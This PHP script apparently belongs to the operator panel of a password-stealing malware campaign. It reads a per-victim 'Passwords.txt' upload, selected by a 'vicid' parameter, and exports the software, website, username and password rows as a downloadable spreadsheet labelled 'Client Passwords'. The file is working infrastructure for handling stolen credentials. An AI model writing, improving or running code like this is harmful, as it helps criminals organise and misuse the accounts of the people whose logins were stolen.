<?php
require_once '../session.php';
require_once APP_PATH . 'classes/Clients.php';

use PhpOffice\PhpSpreadsheet\Spreadsheet;
use PhpOffice\PhpSpreadsheet\Writer\Xlsx;

$vicID = isset($_GET['vicid']) ? $utils->sanitize($_GET['vicid']) : '';

if (file_exists(APP_PATH . "upload/$vicID/Passwords.txt")) {
    $lines = $utils->parseFile(APP_PATH . "upload/$vicID/Passwords.txt", "\n", true);
}

$spreadsheet = new Spreadsheet();

$sheet = $spreadsheet->getActiveSheet();

$sheet->setCellValue('A1', 'Software');
$sheet->setCellValue('B1', 'Website');
$sheet->setCellValue('C1', 'Username');
$sheet->setCellValue('D1', 'Password');

$i = 2;
foreach ($lines as $line) {
    $result = explode(",", $line);
    if ($result[2] !== "" && $result[3] !== "") {
        $sheet->setCellValue("A" . $i, $result[0]);
        $sheet->setCellValue("B" . $i, $utils->validateURL($result[1]));
        $sheet->setCellValue("C" . $i, $result[2]);
        $sheet->setCellValue("D" . $i, $result[3]);
        $i++;
    }
}

$writer = new Xlsx($spreadsheet);

$filename = 'Client Passwords - ' .  $vicID .  '.xlsx';

header('Content-Type: application/vnd.ms-excel');
header('Content-Disposition: attachment;filename=' . $filename);
header('Cache-Control: max-age=0');

$writer->save('php://output');
